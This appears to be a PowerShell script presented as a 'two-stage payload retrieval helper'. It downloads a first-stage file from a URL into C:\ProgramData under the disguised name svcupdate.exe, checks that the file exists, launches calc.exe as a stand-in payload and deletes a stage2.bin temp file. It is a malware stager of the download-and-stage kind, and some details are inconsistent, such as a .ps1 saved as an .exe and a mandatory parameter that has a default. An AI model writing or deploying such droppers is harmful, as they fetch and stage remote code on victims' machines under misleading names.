<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$DownloadUrl = 'http://internal.corp/stage1.ps1',
    [string]$PayloadPath = 'C:\ProgramData\svcupdate.exe',
    [int]$ConnectionTimeout = 170
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $OperationResult = Get-Stage1Payload -SourceUrl $DownloadUrl -DestinationPath $PayloadPath -TimeoutSec $ConnectionTimeout
    if ($OperationResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
